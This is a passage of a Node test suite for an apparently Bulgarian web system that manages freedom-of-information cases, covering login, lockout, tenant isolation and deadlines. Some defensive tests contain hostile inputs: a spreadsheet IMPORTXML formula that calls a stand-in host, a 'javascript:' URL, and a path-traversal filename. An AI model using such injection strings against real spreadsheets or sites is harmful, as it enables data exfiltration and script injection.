/* node --test tests/ */
const test = require('node:test'), assert = require('node:assert/strict');
const { load } = require('./mock-google');

const orgData = (over = {}) => Object.assign({
  name: 'Община Тест', type: 'Община', basis: 'чл. 3, ал. 1', eik: '000696327', oblast: 'София', municipality: 'Столична', city: 'София', postcode: '1000',
  address: 'ул. Първа 1', phone: '+35929000000', email: 'obshtina@example.org', web: 'https://example.org', headName: 'Иван Иванов', headPosition: 'Кмет',
  unitName: 'Деловодство', unitAddress: 'ул. Първа 1', unitEmail: 'zdoi@example.org', unitPhone: '029000001', unitHours: '9–17 ч.', court: 'Административен съд София-град',
  adminName: 'Мария Петрова', adminPosition: 'Юрисконсулт', adminEmail: 'admin@example.org', adminPhone: '0888000000', adminUsername: 'mpetrova', declare: true
}, over);
const HASH = c => c.repeat(44);
const tokenOf = link => link.split('/').pop();
const parts = link => /activate\/(\d+)\/([^/]+)\/(\w+)/.exec(link);
/* последната връзка за парола, изпратена на този адрес */
const mailed = (g, to) => { const m = g.mails.filter(x => x.to === to && /activate/.test(x.body)).at(-1); assert.ok(m, 'няма писмо с връзка до ' + to); return parts(m.body); };
let counter = 1000000;
const newNo = g => { const b = String(counter++); return b + g.t.luhn_(b); };
const apply = (g, over) => g.call('public.apply', Object.assign(orgData(over), { no: newNo(g), hash: HASH('p') }, over));
const addStaff = (g, adminToken, username = 'emp1') => {
  const r = g.call('users.save', { isNew: true, username, name: 'Служител', position: 'Експерт', email: 'emp@example.org', role: 'Служител' }, adminToken);
  assert.equal(r.created, true, JSON.stringify(r));
  assert.equal(r.emailed, true);
  assert.equal(r.link, undefined, 'връзката не се показва на екрана');
  return mailed(g, 'emp@example.org');
};

function operator(g) {
  const link = g.setup();
  const r = g.call('activate', { no: '00000000', username: 'admin', token: tokenOf(link), hash: HASH('o') });
  assert.equal(r.ok, true, JSON.stringify(r));
  return g.call('login', { no: '00000000', username: 'admin', hash: HASH('o') }).token;
}
function approve(g, op, over) {
  const a = apply(g, over);
  assert.equal(a.ok, true, JSON.stringify(a));
  const d = g.call('op.decide', { id: a.id, approve: true }, op);
  assert.equal(d.ok, true, JSON.stringify(d));
  const username = (over && over.adminUsername) || 'mpetrova';
  const l = g.call('login', { no: d.no, username, hash: HASH('p') });
  assert.equal(l.ok, true, JSON.stringify(l));
  return { no: d.no, token: l.token, username };
}
const caseData = (over = {}) => Object.assign({
  kind: 'Достъп до обществена информация', regDate: '2026-11-02', channel: 'Писмено', applicantType: 'Гражданин', applicantName: 'Петър Петров',
  applicantAddress: 'ул. Втора 2', applicantOblast: 'София (столица)', subject: 'Договори за 2025 г.', form: 'копия на материален носител'
}, over);
const updateData = (c, over = {}) => Object.assign({}, c, over);
const setupTwo = () => {
  const g = load(), op = operator(g);
  const a = approve(g, op);
  const b = approve(g, op, { name: 'Агенция Б', type: 'Друга администрация', eik: '121758615', adminUsername: 'bobo', adminEmail: 'b@example.org', email: 'b-org@example.org' });
  return { g, op, a, b };
};

test('EIK validation accepts real numbers and rejects bad checksums', () => {
  const { t } = load();
  assert.equal(t.validEik_('000696327'), true);
  assert.equal(t.validEik_('000696328'), false);
  assert.equal(t.validEik_('12345'), false);
});

test('holidays and terms: deadline ending on non-working day moves forward', () => {
  const { t } = load();
  assert.equal(t.term_('2026-12-10', 14), '2026-12-29'); // 24–26.12 празници, 27 неделя, 28 почивен вместо 26 (събота)
  assert.equal(t.term_('2026-04-30', 1), '2026-05-04'); // 01.05 празник (петък), 02–03 уикенд
  assert.equal(t.term_('2026-04-02', 8), '2026-04-14'); // Великден 12.04.2026: 10–13 са неработни
});

test('registration requires all organization data and declaration', () => {
  const g = load(); operator(g);
  for (const k of ['address', 'postcode', 'headName', 'unitEmail', 'adminEmail']) {
    const r = apply(g, { [k]: '' });
    assert.equal(r.ok, false, k);
  }
  assert.equal(apply(g, { declare: false }).ok, false);
  assert.equal(apply(g, { eik: '123456789' }).error, 'eik');
  assert.equal(apply(g, { hash: '' }).error, 'value');
  assert.equal(apply(g, { no: '00000000' }).error, 'value');
  assert.equal(apply(g, { no: '12345678' }).error, 'value', 'wrong check digit');
});

test('access goes by email to the person concerned: number and one-time link, never a password', () => {
  const g = load(), op = operator(g);
  g.mails.length = 0;
  const pending = apply(g);
  const received = g.mails.filter(m => m.to === 'obshtina@example.org').at(-1);
  assert.ok(!/\d{8}/.test(received.body.split('--')[0]), 'при подаване няма номер в писмото');
  const d = g.call('op.decide', { id: pending.id, approve: true }, op);
  assert.equal(d.emailed, true);
  const toAdmin = g.mails.filter(m => m.to === 'admin@example.org').at(-1);
  assert.ok(toAdmin.body.includes(d.no) && toAdmin.body.includes('mpetrova'), 'администраторът получава номера');
  assert.ok(!/activate/.test(toAdmin.body), 'паролата е избрана при заявката');
  const toOfficial = g.mails.filter(m => m.to === 'obshtina@example.org').at(-1);
  assert.ok(!toOfficial.body.includes(d.no) && !toOfficial.body.includes('mpetrova'), 'официалният имейл не получава данните за вход');
  const token = g.call('login', { no: d.no, username: 'mpetrova', hash: HASH('p') }).token;
  const e = addStaff(g, token);
  const staffMail = g.mails.filter(m => m.to === 'emp@example.org').at(-1);
  assert.ok(staffMail.body.includes(d.no) && staffMail.body.includes('emp1') && e[3].length === 64);
  assert.equal(g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') }).ok, true);
  g.mails.forEach(m => assert.ok(!m.body.includes(HASH('p')) && !m.body.includes(HASH('e')) && !/парола:\s*\S/i.test(m.body), m.body));
});

test('forgotten password: link by email with the same answer for known and unknown accounts', () => {
  const { g, a } = setupTwo();
  g.mails.length = 0;
  const known = g.call('forgot', { no: a.no, username: a.username });
  const unknown = g.call('forgot', { no: a.no, username: 'nobody' });
  const badOrg = g.call('forgot', { no: '12345678', username: a.username });
  const operatorTry = g.call('forgot', { no: '00000000', username: 'admin' });
  for (const r of [known, unknown, badOrg, operatorTry]) { assert.equal(r.ok, true); assert.equal(Object.keys(r).filter(k => k !== 'ok' && k !== 'now').length, 0); }
  assert.equal(g.mails.length, 1, 'само към съществуващия потребител');
  const m = mailed(g, 'admin@example.org');
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).ok, true, 'старата парола работи до смяната');
  for (let i = 0; i < 5; i++) g.call('login', { no: a.no, username: a.username, hash: HASH('x') });
  assert.equal(g.call('activate', { no: m[1], username: m[2], token: m[3], hash: HASH('n') }).ok, true);
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('n') }).ok, true, 'новата парола отменя заключването');
  for (let i = 0; i < 8; i++) g.call('forgot', { no: a.no, username: a.username });
  assert.ok(g.mails.filter(x => /activate/.test(x.body)).length <= 5, 'ограничен брой писма');
  g.advance(3 * 36e5);
  const expired = g.mails.filter(x => /activate/.test(x.body)).at(-1);
  const old = parts(expired.body);
  assert.equal(g.call('activate', { no: old[1], username: old[2], token: old[3], hash: HASH('z') }).error, 'invite', 'връзката важи 2 часа');
});

test('wrong data: remaining attempts are shown, lock is reported, and all limits apply', () => {
  const { g, a, b } = setupTwo();
  g.mails.length = 0;
  const r1 = g.call('login', { no: a.no, username: a.username, hash: HASH('x') });
  assert.ok(r1.message.includes('Остават 4'), r1.message);
  for (let i = 0; i < 3; i++) g.call('login', { no: a.no, username: a.username, hash: HASH('x') });
  const last = g.call('login', { no: a.no, username: a.username, hash: HASH('x'), ip: '203.0.113.9' });
  assert.equal(last.error, 'locked');
  const notice = g.mails.filter(m => m.to === 'admin@example.org').at(-1);
  assert.ok(notice.body.includes('203.0.113.9'), 'известие за заключване с IP');
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).error, 'locked', 'и с вярна парола');
  // от един IP адрес, през различни потребители
  const ip = '198.51.100.7';
  for (let i = 0; i < 20; i++) g.call('login', { no: b.no, username: 'user' + i, hash: HASH('x'), ip });
  assert.equal(g.call('login', { no: b.no, username: b.username, hash: HASH('p'), ip }).error, 'locked', 'спрян IP адрес');
  assert.equal(g.call('login', { no: b.no, username: b.username, hash: HASH('p'), ip: '198.51.100.8' }).ok, true, 'друг адрес работи');
  // текуща парола при смяна
  for (let i = 0; i < 5; i++) assert.equal(g.call('password', { current: HASH('x'), next: HASH('n') }, b.token).error, 'password');
  assert.equal(g.call('password', { current: HASH('p'), next: HASH('n') }, b.token).error, 'locked');
});

test('administrators see logins with IP address; others do not', () => {
  const { g, op, a, b } = setupTwo();
  g.call('login', { no: a.no, username: a.username, hash: HASH('x'), ip: '203.0.113.5', agent: 'Браузър А' });
  g.call('login', { no: a.no, username: 'secret.typed', hash: HASH('x'), ip: '203.0.113.5' });
  g.call('login', { no: a.no, username: a.username, hash: HASH('p'), ip: 'не е адрес' });
  g.call('login', { no: a.no, username: a.username, hash: HASH('p'), ip: '203.0.113.5', agent: 'Браузър А' });
  g.call('login', { no: a.no, username: a.username, hash: HASH('p'), ip: '2001:db8::1' });
  g.call('login', { no: a.no, username: a.username, hash: HASH('p'), ip: '203.0.113.5' });
  const { logins } = g.call('logins.list', {}, a.token);
  const results = logins.map(l => l.result);
  assert.ok(results.includes('Грешна парола') && results.includes('Успешен'));
  assert.equal(logins[0].ip, '203.0.113.5');
  assert.equal(logins[0].newIp, false, 'познат адрес');
  assert.equal(logins[1].ip, '2001:db8::1');
  assert.equal(logins[1].newIp, true, 'нов адрес');
  assert.ok(logins.some(l => l.username === '(непознат)'));
  assert.ok(!JSON.stringify(logins).includes('secret.typed'), 'въведеното име не се пази');
  assert.equal(logins.find(l => l.ip === '' ).ip, '', 'невалиден адрес не се записва');
  assert.ok(!g.call('logins.list', {}, b.token).logins.some(l => l.ip === '203.0.113.5'), 'друга организация');
  const e = addStaff(g, a.token);
  g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') });
  const staff = g.call('login', { no: a.no, username: 'emp1', hash: HASH('e') }).token;
  assert.equal(g.call('logins.list', {}, staff).error, 'role', 'служителят не вижда входовете');
  assert.ok(g.call('op.logins', { no: a.no }, op).logins.length >= 5);
  assert.equal(g.call('op.logins', { no: a.no }, a.token).error, 'role');
  assert.ok(g.call('op.org.get', { no: a.no }, op).logins.length >= 5);
});

test('EIK or BULSTAT of addressees and applicants is checked and kept', () => {
  const { g, a } = setupTwo();
  assert.equal(g.call('addressees.save', { type: 'Юридическо лице', name: 'Фирма', address: 'ул. А', eik: '123456789' }, a.token).error, 'eik');
  const r = g.call('addressees.save', { type: 'Юридическо лице', name: 'Фирма', address: 'ул. А', eik: '831902088' }, a.token);
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(g.call('org.bootstrap', {}, a.token).addressees[0].eik, '831902088');
  assert.equal(g.call('case.create', caseData({ applicantEik: '123' }), a.token).error, 'eik');
  const c = g.call('case.create', caseData({ applicantType: 'Юридическо лице', applicantName: 'Друга', applicantEik: '121758615', saveAddressee: 'on' }), a.token);
  assert.equal(c.ok, true, JSON.stringify(c));
  assert.equal(g.call('case.get', { regNo: c.regNo }, a.token).case.applicantEik, '121758615');
  assert.ok(g.call('org.bootstrap', {}, a.token).addressees.some(x => x.eik === '121758615'));
});

const b64 = s => Buffer.from(s).toString('base64');

test('court cases: stored per organization, linked to a case and following case rights', () => {
  const { g, a, b } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const data = { regNo: reg, court: 'Административен съд – Варна', caseNo: '1234', year: '2026', kind: 'Административно дело', status: 'Насрочено', nextHearing: '2026-12-10', note: 'Бележка' };
  assert.equal(g.call('court.save', Object.assign({}, data, { caseNo: '' }), a.token).error, 'required');
  assert.equal(g.call('court.save', Object.assign({}, data, { year: '26' }), a.token).error, 'value');
  assert.equal(g.call('court.save', Object.assign({}, data, { kind: 'Друг' }), a.token).error, 'value');
  assert.equal(g.call('court.save', Object.assign({}, data, { regNo: 'липсва' }), a.token).error, 'notfound');
  const r = g.call('court.save', data, a.token);
  assert.equal(r.ok, true, JSON.stringify(r));
  const got = g.call('case.get', { regNo: reg }, a.token);
  assert.equal(got.courts[0].caseNo, '1234');
  assert.ok(got.events.some(e => e.kind === 'Съдебно дело'));
  assert.equal(g.call('space.list', {}, a.token).courts.length, 1);
  assert.equal(g.call('space.list', {}, b.token).courts.length, 0, 'друга организация');
  assert.equal(g.call('court.get', { id: r.id }, b.token).error, 'notfound');
  assert.equal(g.call('court.save', Object.assign({}, data, { id: r.id, status: 'Решено' }), a.token).ok, true);
  assert.equal(g.call('court.get', { id: r.id }, a.token).court.status, 'Решено');
  const own = staffWith(g, a.token, a.no, 'own1', ['casesEdit']).token;
  assert.equal(g.call('space.list', {}, own).courts.length, 0, 'без право за всички не вижда чуждо дело');
  assert.equal(g.call('court.get', { id: r.id }, own).error, 'notfound');
  assert.equal(g.call('court.save', data, own).error, 'notfound', 'чужда преписка');
  const ro = staffWith(g, a.token, a.no, 'ro1', ['casesAll']).token;
  assert.equal(g.call('space.list', {}, ro).courts.length, 1);
  assert.equal(g.call('court.save', data, ro).error, 'role');
  assert.equal(g.call('court.delete', { id: r.id }, ro).error, 'role');
});

test('files: uploaded to a case or court case, limited, downloaded and deleted with rights', () => {
  const { g, a, b } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const up = (over, token = a.token) => g.call('file.upload', Object.assign({ scope: 'case', ref: reg, name: 'Жалба.pdf', data: b64('%PDF съдържание') }, over), token);
  assert.equal(up({ name: 'вирус.exe' }).error, 'filetype');
  assert.equal(up({ name: 'без-разширение' }).error, 'filetype');
  assert.equal(up({ data: 'не е base64!' }).error, 'value');
  assert.equal(up({ data: '' }).error, 'value');
  assert.equal(up({ ref: 'липсва' }).error, 'notfound');
  assert.equal(up({ data: 'A'.repeat(14.1 * 1048576) }).error, 'filesize');
  assert.equal(up({}, b.token).error, 'notfound', 'чужда организация');
  const r = up({ name: '../Жалба.pdf' });
  assert.equal(r.ok, true, JSON.stringify(r));
  const got = g.call('case.get', { regNo: reg }, a.token);
  assert.equal(got.files.length, 1);
  assert.equal(got.files[0].name, '.._Жалба.pdf');
  assert.equal(got.files[0].driveId, undefined, 'идентификаторът в Drive не излиза');
  assert.ok(got.space.used > 0 && got.space.limit === 1024 * 1048576);
  assert.equal(Buffer.from(g.call('file.get', { id: r.id }, a.token).data, 'base64').toString(), '%PDF съдържание');
  assert.equal(g.call('file.get', { id: r.id }, b.token).error, 'notfound');
  const own = staffWith(g, a.token, a.no, 'own2', ['casesEdit']).token;
  assert.equal(g.call('file.get', { id: r.id }, own).error, 'notfound', 'чужда преписка');
  assert.equal(g.call('file.delete', { id: r.id }, own).error, 'notfound');
  const ro = staffWith(g, a.token, a.no, 'ro2', ['casesAll']).token;
  assert.equal(g.call('file.get', { id: r.id }, ro).ok, true);
  assert.equal(up({}, ro).error, 'role');
  assert.equal(g.call('file.delete', { id: r.id }, ro).error, 'role');
  const folderA = [...g.files.values()][0].folder;
  const court = g.call('court.save', { court: 'Съд', caseNo: '1', year: '2026', kind: 'Друго', status: 'Образувано' }, a.token);
  const cf = up({ scope: 'court', ref: court.id, name: 'Решение.docx' });
  assert.equal(cf.ok, true, JSON.stringify(cf));
  assert.equal(g.call('court.get', { id: court.id }, a.token).files[0].name, 'Решение.docx');
  assert.equal(g.call('space.list', {}, a.token).files.length, 2);
  const inB = g.call('file.upload', { scope: 'court', ref: g.call('court.save', { court: 'С', caseNo: '2', year: '2026', kind: 'Друго', status: 'Образувано' }, b.token).id, name: 'Б.pdf', data: b64('x') }, b.token);
  assert.equal(inB.ok, true);
  assert.notEqual([...g.files.values()].at(-1).folder, folderA, 'отделна папка за всяка организация');
  assert.equal(g.call('court.delete', { id: court.id }, a.token).ok, true);
  assert.equal(g.call('space.list', {}, a.token).files.length, 1, 'файловете на делото се трият с него');
  assert.equal(g.call('file.delete', { id: r.id }, a.token).ok, true);
  assert.equal(g.call('space.list', {}, a.token).space.used, 0);
  assert.equal([...g.files.values()].filter(f => !f.trashed).length, 1);
});

test('oversized requests are refused except for file upload', () => {
  const g = load(); operator(g);
  const send = o => JSON.parse(g.ctx.doPost({ postData: { contents: JSON.stringify(o) } }).text);
  assert.equal(send({ action: 'login', data: { pad: 'x'.repeat(400000) } }).error, 'size');
  assert.equal(send({ action: 'file.upload', data: { pad: 'x'.repeat(400000) } }).error, 'session');
  assert.equal(send({ action: 'file.upload', data: { pad: 'x'.repeat(15 * 1048576) } }).error, 'size');
});

test('administrator password chosen at registration works only after approval', () => {
  const g = load(), op = operator(g);
  const no = newNo(g);
  const a = g.call('public.apply', Object.assign(orgData(), { no, hash: HASH('z') }));
  assert.equal(a.ok, true, JSON.stringify(a));
  assert.equal(g.call('login', { no, username: 'mpetrova', hash: HASH('z') }).error, 'login');
  const pending = JSON.stringify(g.call('op.apps', {}, op));
  assert.ok(!/"hash"|"salt"/.test(pending), 'hash not shown to the operator');
  assert.equal(g.call('op.decide', { id: a.id, approve: true }, op).no, no);
  assert.equal(g.call('login', { no, username: 'mpetrova', hash: HASH('z') }).ok, true);
  assert.equal(g.call('login', { no, username: 'mpetrova', hash: HASH('y') }).error, 'login');
  const master = [...g.books.values()].find(x => /главна/.test(x.name)).getSheetByName('Заявки за регистрация');
  const hashCol = master.cells[0].indexOf('Хеш');
  assert.equal(master.cells[1][hashCol], '', 'hash removed from master after approval');
});

test('a taken organization number asks the browser to retry', () => {
  const g = load(); operator(g);
  const no = newNo(g);
  assert.equal(g.call('public.apply', Object.assign(orgData(), { no, hash: HASH('z') })).ok, true);
  const r = g.call('public.apply', Object.assign(orgData({ eik: '121758615' }), { no, hash: HASH('z') }));
  assert.equal(r.error, 'retry');
});

test('new columns are added to a master table created by an older version', () => {
  const g = load(); operator(g);
  const master = [...g.books.values()].find(x => /главна/.test(x.name));
  const sheet = master.insertSheet('стар');
  master.deleteSheet(master.getSheetByName('Заявки за регистрация'));
  sheet.name = 'Заявки за регистрация';
  const old = ['№', 'Подадена', 'Статус', 'Организация', 'ЕИК/БУЛСТАТ', 'Вид', 'Официален имейл', 'Данни (JSON)', 'Причина за отказ', 'Решил', 'Дата на решение', 'Номер на организация'];
  sheet.getRange(1, 1, 1, old.length).setValues([old]);
  g.ctx.resetHeaders(); // ново изпълнение на скрипта
  const a = apply(g);
  assert.equal(a.ok, true, JSON.stringify(a));
  assert.equal(sheet.cells[0].at(-1), 'Хеш');
});

test('organization cannot log in before approval; duplicates are rejected', () => {
  const g = load(), op = operator(g);
  const a = apply(g);
  assert.equal(a.ok, true);
  assert.equal(apply(g).error, 'duplicate');
  assert.equal(g.call('op.apps', {}, op).apps[0].status, 'Чака одобрение');
  assert.equal(g.books.size, 1, 'no organization spreadsheet before approval');
});

test('rejection records reason and creates no spreadsheet', () => {
  const g = load(), op = operator(g);
  const a = apply(g);
  assert.equal(g.call('op.decide', { id: a.id, approve: false }, op).error, 'required');
  assert.equal(g.call('op.decide', { id: a.id, approve: false, reason: 'Неверни данни' }, op).ok, true);
  assert.equal(g.call('op.apps', {}, op).apps[0].status, 'Отказана');
  assert.equal(g.books.size, 1);
  assert.equal(g.call('op.decide', { id: a.id, approve: true }, op).error, 'state');
});

test('each organization gets its own spreadsheet in the data folder', () => {
  const { g, a, b } = setupTwo();
  assert.equal(g.books.size, 3); // главна + 2
  assert.notEqual(a.no, b.no);
  const orgBooks = [...g.books.values()].filter(x => /^ЗДОИ4You – \d{8}/.test(x.name));
  assert.equal(orgBooks.length, 2);
  orgBooks.forEach(x => {
    assert.equal(x.folder, 'folder1');
    ['Профил', 'Потребители', 'Преписки', 'Събития', 'Документи', 'Чл. 15', 'Броячи', 'Дневник'].forEach(n => assert.ok(x.getSheetByName(n), n));
    assert.equal(x.getSheetByName('Лист1'), null);
  });
  const masterSheets = [...g.books.values()].find(x => /главна/.test(x.name)).sheets.map(s => s.name);
  assert.ok(!masterSheets.includes('Преписки'), 'cases are never in the master spreadsheet');
});

test('tenant isolation: same register number, separate data, no cross access', () => {
  const { g, a, b } = setupTwo();
  const ca = g.call('case.create', caseData({ subject: 'ТАЙНА НА А' }), a.token);
  const cb = g.call('case.create', caseData({ subject: 'ДАННИ НА Б' }), b.token);
  assert.equal(ca.regNo, cb.regNo, 'numbering is per organization');
  assert.equal(g.call('case.get', { regNo: ca.regNo }, a.token).case.subject, 'ТАЙНА НА А');
  assert.equal(g.call('case.get', { regNo: cb.regNo }, b.token).case.subject, 'ДАННИ НА Б');
  assert.ok(!JSON.stringify(g.call('case.list', {}, b.token)).includes('ТАЙНА НА А'));
  // опит да се подаде чужд номер или таблица в данните не променя организацията
  const forged = g.call('case.list', { no: a.no, sheetId: 'book2', org: a.no }, b.token);
  assert.ok(!JSON.stringify(forged).includes('ТАЙНА НА А'));
  const orgBooks = [...g.books.values()].filter(x => /^ЗДОИ4You – \d{8}/.test(x.name));
  const hasA = orgBooks.filter(x => JSON.stringify(x.getSheetByName('Преписки').cells).includes('ТАЙНА НА А'));
  assert.equal(hasA.length, 1, 'stored in exactly one spreadsheet');
});

test('login needs the right organization number, user and password', () => {
  const { g, a, b } = setupTwo();
  assert.equal(g.call('login', { no: b.no, username: a.username, hash: HASH('p') }).error, 'login');
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('x') }).error, 'login');
  const u = g.call('login', { no: a.no, username: 'nobody', hash: HASH('x') });
  const w = g.call('login', { no: b.no, username: b.username, hash: HASH('x') });
  assert.equal(u.message, w.message, 'no user enumeration');
});

test('lockout after repeated failures, then recovery', () => {
  const { g, a } = setupTwo();
  for (let i = 0; i < 5; i++) g.call('login', { no: a.no, username: a.username, hash: HASH('x') });
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).error, 'locked');
  g.advance(16 * 60e3);
  assert.equal(g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).ok, true);
});

test('invitation is single use and expires', () => {
  const { g, a } = setupTwo();
  const m = addStaff(g, a.token);
  assert.equal(g.call('login', { no: m[1], username: m[2], hash: HASH('e') }).error, 'login', 'no password before activation');
  assert.equal(g.call('activate', { no: m[1], username: m[2], token: m[3], hash: HASH('e') }).ok, true);
  assert.equal(g.call('activate', { no: m[1], username: m[2], token: m[3], hash: HASH('q') }).error, 'invite');
  assert.equal(g.call('login', { no: m[1], username: m[2], hash: HASH('e') }).ok, true);
  const e = addStaff(g, g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).token, 'emp2');
  g.advance(8 * 864e5);
  assert.equal(g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') }).error, 'invite');
});

test('roles: staff cannot administer, organization cannot reach operator actions', () => {
  const { g, a } = setupTwo();
  const e = addStaff(g, a.token);
  g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') });
  const staff = g.call('login', { no: a.no, username: 'emp1', hash: HASH('e') }).token;
  assert.equal(g.call('case.create', caseData(), staff).ok, true);
  for (const act of ['users.list', 'users.save', 'org.changeRequest', 'log.list']) assert.equal(g.call(act, {}, staff).error, 'role', act);
  assert.equal(g.call('org.save', {}, staff).error, 'action', 'no direct editing');
  for (const act of ['op.apps', 'op.orgs', 'op.decide', 'op.log']) assert.equal(g.call(act, {}, a.token).error, 'role', act);
  assert.equal(g.call('case.list', {}, 'x'.repeat(64)).error, 'session');
  assert.equal(g.call('case.list', {}).error, 'session');
});

test('deactivated user and suspended organization lose access immediately', () => {
  const { g, op, a, b } = setupTwo();
  assert.equal(g.call('case.list', {}, b.token).ok, true);
  assert.equal(g.call('op.status', { no: b.no, status: 'Спряна' }, op).ok, true);
  assert.equal(g.call('case.list', {}, b.token).error, 'session');
  assert.equal(g.call('login', { no: b.no, username: b.username, hash: HASH('p') }).error, 'login');
  const e = addStaff(g, a.token);
  g.call('activate', { no: e[1], username: e[2], token: e[3], hash: HASH('e') });
  const staff = g.call('login', { no: a.no, username: 'emp1', hash: HASH('e') }).token;
  assert.equal(g.call('case.list', {}, staff).ok, true);
  g.call('users.save', { username: 'emp1', name: 'С', position: 'Е', email: 'e@example.org', role: 'Служител', active: false }, a.token);
  assert.equal(g.call('case.list', {}, staff).error, 'session');
});

test('the last active administrator cannot be removed', () => {
  const { g, a } = setupTwo();
  const r = g.call('users.save', { username: a.username, name: 'М', position: 'Ю', email: 'admin@example.org', role: 'Служител' }, a.token);
  assert.equal(r.error, 'lastadmin');
});

test('session expires after 30 minutes and can be extended; logout ends it', () => {
  const { g, a } = setupTwo();
  g.advance(29 * 60e3);
  assert.equal(g.call('extend', {}, a.token).ok, true);
  g.advance(29 * 60e3);
  assert.equal(g.call('case.list', {}, a.token).ok, true);
  g.advance(2 * 60e3);
  assert.equal(g.call('case.list', {}, a.token).error, 'session');
  const t = g.call('login', { no: a.no, username: a.username, hash: HASH('p') }).token;
  g.call('logout', {}, t);
  assert.equal(g.call('case.list', {}, t).error, 'session');
});

test('no API response ever contains password material', () => {
  const { g, op, a } = setupTwo();
  const all = [g.call('users.list', {}, a.token), g.call('org.bootstrap', {}, a.token), g.call('op.orgs', {}, op), g.call('op.apps', {}, op)];
  all.forEach(r => {
    assert.equal(r.ok, true);
    const s = JSON.stringify(r);
    assert.ok(!/"(salt|hash|inviteHash)"/.test(s), s.slice(0, 200));
    assert.ok(!/sheetId/.test(JSON.stringify(g.call('op.orgs', {}, op))));
  });
});

test('formula-looking input is stored inert and read back unchanged', () => {
  const { g, a } = setupTwo();
  const r = g.call('case.create', caseData({ applicantName: '=IMPORTXML("http://evil","//a")', applicantPhone: '+359888' }), a.token);
  const c = g.call('case.get', { regNo: r.regNo }, a.token).case;
  assert.equal(c.applicantName, '=IMPORTXML("http://evil","//a")');
  assert.equal(c.applicantPhone, '+359888');
  const book = [...g.books.values()].find(x => JSON.stringify(x.getSheetByName('Преписки')?.cells || []).includes('IMPORTXML'));
  assert.ok(book.getSheetByName('Преписки').cells[1].some(v => String(v).startsWith("'=IMPORTXML")));
});

test('deadlines follow arts. 28–31 and the clarify cycle', () => {
  const { g, a } = setupTwo();
  const reg = g.call('case.create', caseData({ regDate: '2026-11-02' }), a.token).regNo;
  let c = g.call('case.get', { regNo: reg }, a.token).case;
  assert.equal(c.due, '2026-11-16');
  g.call('doc.create', { type: 'extend30', regNo: reg, title: 'x', date: '2026-11-03', fields: { days: '10', reason: 'голямо количество' } }, a.token);
  c = g.call('case.get', { regNo: reg }, a.token).case;
  assert.equal(c.due, '2026-11-26');
  assert.equal(g.call('doc.create', { type: 'extend30', regNo: reg, fields: { days: '11', reason: 'x' } }, a.token).error, 'value');
  g.call('doc.create', { type: 'clarify', regNo: reg, title: 'x', date: '2026-11-04', fields: { what: 'кои договори' } }, a.token);
  c = g.call('case.get', { regNo: reg }, a.token).case;
  assert.equal(c.status, 'Чака уточняване');
  assert.equal(c.due, '2026-12-04');
  const u = g.call('case.update', updateData(c, { clarifyGot: '2026-11-10' }), a.token);
  assert.equal(u.ok, true, JSON.stringify(u));
  c = g.call('case.get', { regNo: reg }, a.token).case;
  assert.equal(c.status, 'В обработка');
  assert.equal(c.due, '2026-12-04'); // 10.11 + 14 + 10
});

test('decision documents validate the law and update the case', () => {
  const { g, a } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const short = { scope: 'пълен', accessDays: '10', place: 'х', accessForm: 'х', costs: '0' };
  assert.equal(g.call('doc.create', { type: 'grant', regNo: reg, fields: short }, a.token).error, 'accessDays');
  const ok = g.call('doc.create', { type: 'grant', regNo: reg, title: 'Решение', date: '2026-11-05', fields: { ...short, accessDays: '30' } }, a.token);
  assert.equal(ok.ok, true, JSON.stringify(ok));
  assert.equal(ok.no, 'РЕШ-2026-0001');
  const c = g.call('case.get', { regNo: reg }, a.token);
  assert.equal(c.case.outcome, 'Предоставен достъп');
  assert.equal(c.case.decisionNo, 'РЕШ-2026-0001');
  assert.equal(c.case.due, '', 'no pending deadline after a decision');
  assert.equal(c.docs.length, 1);
  const again = g.call('doc.get', { id: ok.id }, a.token);
  assert.deepEqual(again.payload, ok.payload);
  assert.equal(g.call('doc.create', { type: 'refuse', regNo: reg, fields: { groundKey: 'zz', factual: 'x' } }, a.token).error, 'value');
  assert.equal(g.call('doc.create', { type: 'refuse', regNo: reg, fields: { groundKey: 't2' } }, a.token).error, 'required');
});

test('a document from one organization is unreachable from another', () => {
  const { g, a, b } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const doc = g.call('doc.create', { type: 'noinfo', regNo: reg, title: 'x', fields: {} }, a.token);
  assert.equal(doc.ok, true, JSON.stringify(doc));
  assert.equal(g.call('doc.get', { id: doc.id }, b.token).error, 'notfound');
});

test('annual report counts by year, outcome and refusal ground', () => {
  const { g, a } = setupTwo();
  const r1 = g.call('case.create', caseData({ regDate: '2025-03-03' }), a.token).regNo;
  g.call('case.create', caseData({ regDate: '2025-04-01', kind: 'Повторно използване на информация', applicantType: 'Журналист или медия' }), a.token);
  g.call('case.create', caseData({ regDate: '2026-01-05' }), a.token);
  g.call('doc.create', { type: 'refuse', regNo: r1, title: 'x', date: '2025-03-10', fields: { groundKey: 't3', factual: 'предоставена е' } }, a.token);
  const s = g.call('report.stats', { year: '2025' }, a.token).stats;
  assert.equal(s.total, 2);
  assert.equal(s.access, 1);
  assert.equal(s.reuse, 1);
  assert.equal(s.refusals, 1);
  assert.equal(s.byOutcome['Отказ'], 1);
  assert.equal(s.byApplicant['Журналист или медия'], 1);
  assert.ok(Object.entries(s.grounds).some(([k, v]) => k.includes('т. 3') && v === 1));
  const d = g.call('doc.create', { type: 'report', title: 'x', fields: { year: '2025' } }, a.token);
  assert.equal(d.payload.stats.total, 2);
});

test('article 15 items are saved per item and validated', () => {
  const { g, a } = setupTwo();
  assert.equal(g.call('art15.save', { item: '18', text: 'x' }, a.token).error, 'value');
  assert.equal(g.call('art15.save', { item: '4', text: 'x', url: 'javascript:alert(1)' }, a.token).error, 'value');
